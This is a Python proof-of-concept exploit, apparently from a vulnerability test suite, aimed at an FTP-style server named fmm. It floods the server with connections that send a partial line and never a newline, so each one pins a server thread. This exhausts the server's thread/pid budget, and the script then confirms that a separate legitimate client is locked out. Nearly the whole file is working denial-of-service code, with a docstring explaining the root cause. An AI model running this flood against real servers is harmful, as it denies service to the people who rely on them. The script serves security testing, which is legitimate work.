#!/usr/bin/env python3
r"""
PoC #8: Resource-exhaustion DoS -- thread/pid exhaustion via the uncapped
accept loop + unbounded recv_line() (fmm.cpp)
------------------------------------------------------------------------
Two independent unbounded-resource sinks share one root cause -- fmm never
limits the work a single client (or a swarm of them) can pin server-side:

  (a) recv_line() grows a std::string one byte at a time waiting for '\n',
      with no cap. A client that sends bytes but never a newline parks that
      connection's server thread in recv() indefinitely (and, at scale, grows
      memory without bound).

  (b) main()'s accept loop does `std::thread(handle_client, fd).detach()`
      per connection with NO limit and NO per-connection idle timeout. Every
      parked connection keeps a live server thread. Enough parked connections
      exhaust the process/container thread (pid) budget.

CONFIRMATION IS BY LIVENESS / BYSTANDER IMPACT, NOT BY THE ATTACKER'S OWN
CONNECTIONS. Opening N sockets and printing "opened N" proves nothing about
denial -- an attacker exhausting its OWN sockets costs a scoreboard nothing.
So this PoC:

  1. Baselines a SEPARATE normal client (login + PASV + RETR) -- must succeed
     fast on a healthy server.
  2. Floods parked connections (each parks a server thread in recv_line via a
     partial, newline-less line) until fmm stops accepting new ones -- i.e.
     the thread/pid pool is exhausted. The refusal point tracks the
     container's pid cap (pids_limit in vuln_tests/docker-compose.yml), NOT
     the 16-deep listen backlog: raise the cap and the refusal point rises
     with it, which is what proves this is thread/pid exhaustion.
  3. Re-probes the SEPARATE bystander repeatedly while the flood is held
     (topped up in the background so the pool stays saturated). The DoS is
     confirmed only if the bystander is now DENIED (connection refused /
     timeout) on a majority of attempts -- other callers, not just the
     attacker, are locked out. At the cap fmm either wedges (rejects new
     connections) or crashes outright (std::thread throws on pthread_create
     EAGAIN); both deny the bystander, and both are scoreable.
  4. Releases the flood and confirms the bystander recovers.

If the bystander keeps sailing through during the flood, the exhaustion only
tied up the attacker's own sockets and this prints "not a full DoS" + exits 1.

WARNING: genuinely denies service to the target while it runs. Throwaway only.

Run fmm first, then:  python3 08_resource_exhaustion.py [host] [port]
"""
import socket
import sys
import threading
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2121

# Bystander credentials (present in credentials.txt) + a file that ships in
# ftproot/, so the baseline exercises a full, real login+PASV+RETR.
BYS_USER, BYS_PASS = "bob", "hunter2"
RETR_FILE = "welcome.txt"

MAX_FLOOD = 400          # hard ceiling so we never runaway on an uncapped host
REFUSE_STREAK = 3        # consecutive connect failures => pool saturated
# The bystander probes below run CONCURRENTLY (a real pool-exhaustion DoS denies
# them all at once), so PROBES probes cost ONE timeout window, not PROBES of them
# — the old sequential loop spent up to PROBES * 5s here and pushed this PoC well
# over the per-PoC budget.
PROBES = 3               # bystander probes while the flood is held
PROBE_TIMEOUT = 4        # a healthy login+PASV+RETR is well under a second
PROBE_CONFIRM = 2        # majority of PROBES denied => shared-service DoS


def recv_reply(s, timeout=5):
    s.settimeout(timeout)
    try:
        return s.recv(4096).decode(errors="replace")
    except OSError:
        return ""


def bystander_retr(timeout=5):
    """A full, honest normal-client flow over a SEPARATE connection:
    login -> PASV -> connect the data channel -> RETR a real file. Returns
    (ok, detail, seconds). ok=True only if the file actually came back."""
    t0 = time.time()
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.settimeout(timeout)
        s.recv(4096)  # banner
        s.sendall(f"USER {BYS_USER}\n".encode()); recv_reply(s, timeout)
        s.sendall(f"PASS {BYS_PASS}\n".encode())
        if "230" not in recv_reply(s, timeout):
            s.close(); return (False, "login-failed", time.time() - t0)
        s.sendall(b"PASV\n")
        pasv = recv_reply(s, timeout)
        if "227" not in pasv:
            s.close(); return (False, "no-PASV", time.time() - t0)
        nums = pasv[pasv.find("(") + 1:pasv.find(")")].split(",")
        dport = (int(nums[4]) << 8) | int(nums[5])
        d = socket.create_connection((HOST, dport), timeout=timeout)
        s.sendall(f"RETR {RETR_FILE}\n".encode()); recv_reply(s, timeout)
        d.settimeout(timeout)
        body = d.recv(4096); d.close(); s.close()
        return (len(body) > 0, f"RETR {len(body)}B", time.time() - t0)
    except Exception as e:
        return (False, type(e).__name__, time.time() - t0)


held = []
held_lock = threading.Lock()
keep_topping = threading.Event()


def park_one(timeout=5):
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    s.settimeout(timeout)
    s.recv(4096)                      # banner
    s.sendall(b"USER partial-no-newline")  # partial line -> server parks in recv_line()
    return s


def topper():
    """Keep the parked-connection pool saturated during the probe window so a
    freed slot is immediately re-claimed and the bystander stays locked out."""
    while keep_topping.is_set():
        try:
            s = park_one(timeout=3)
            with held_lock:
                held.append(s)
        except OSError:
            time.sleep(0.05)


def main():
    # 1) Baseline -- prove the service is healthy for a normal client first.
    ok, detail, secs = bystander_retr()
    if not ok:
        print(f"[!] Baseline bystander failed ({detail}); is fmm up and healthy? "
              "Cannot run a DoS test against an already-degraded service.")
        sys.exit(2)
    print(f"[*] Baseline: bystander login+PASV+RETR OK in {secs:.2f}s ({detail})")

    # 2) Flood parked connections until fmm stops accepting -- thread/pid pool
    #    exhausted. (recv_line parks each thread; the accept loop never caps.)
    print("[*] Flooding parked connections (each pins a server thread in "
          "recv_line) until fmm refuses new connections...")
    streak = 0
    while len(held) < MAX_FLOOD:
        try:
            s = park_one()
            held.append(s)
            streak = 0
        except OSError:
            streak += 1
            if streak >= REFUSE_STREAK:
                break
    if streak < REFUSE_STREAK:
        print(f"[-] Opened {len(held)} parked connections without fmm ever "
              f"refusing (hit MAX_FLOOD={MAX_FLOOD}); the host's pid budget is "
              "higher than this flood -- raise MAX_FLOOD. Not confirmed.")
        _drain()
        sys.exit(1)
    print(f"[*] fmm refused new connections after {len(held)} parked threads "
          "(thread/pid pool exhausted). Holding the flood; probing a SEPARATE "
          "client...")

    # 3) Keep the pool topped up and probe the bystander.
    keep_topping.set()
    t = threading.Thread(target=topper, daemon=True)
    t.start()
    # Probe concurrently: a shared-service DoS denies every client at once, so we
    # pay one PROBE_TIMEOUT window instead of PROBES sequential ones.
    presults = [None] * PROBES

    def probe(idx):
        presults[idx] = bystander_retr(timeout=PROBE_TIMEOUT)

    pthreads = [threading.Thread(target=probe, args=(i,), daemon=True)
                for i in range(PROBES)]
    for pt in pthreads:
        pt.start()
    for pt in pthreads:
        pt.join(PROBE_TIMEOUT + 2)
    denied = 0
    for i in range(PROBES):
        res = presults[i]
        if res is None:
            denied += 1
            print(f"[*]   bystander probe {i+1}/{PROBES}: DENIED (no return within window)")
            continue
        ok, detail, secs = res
        verdict = "OK" if ok else "DENIED"
        print(f"[*]   bystander probe {i+1}/{PROBES}: {verdict} "
              f"after {secs:.2f}s ({detail})")
        if not ok:
            denied += 1
    keep_topping.clear()

    # 4) Release and confirm recovery.
    print("[*] Releasing the flood...")
    _drain()
    time.sleep(1.5)
    rok, rdetail, rsecs = bystander_retr()
    print(f"[*] Recovery probe: {'OK' if rok else 'STILL DOWN'} in "
          f"{rsecs:.2f}s ({rdetail})")

    if denied > PROBES // 2:
        print(f"[+] Resource-exhaustion DoS confirmed -- with the attacker "
              f"holding the thread/pid pool saturated, a separate normal "
              f"client was DENIED {denied}/{PROBES} times (it succeeded fast at "
              f"baseline). The uncapped accept loop + unbounded recv_line lock "
              f"out every caller, not just the attacker.")
        sys.exit(0)
    print(f"[-] Bystander was denied only {denied}/{PROBES} times while the "
          "attacker's connections were held -- the exhaustion tied up the "
          "attacker's own sockets but did NOT deny other callers. Not a full "
          "DoS. (Raise the flood, or check the container's pid cap.)")
    sys.exit(1)


def _drain():
    with held_lock:
        socks = list(held)
        held.clear()
    for s in socks:
        try:
            s.close()
        except OSError:
            pass


if __name__ == "__main__":
    main()
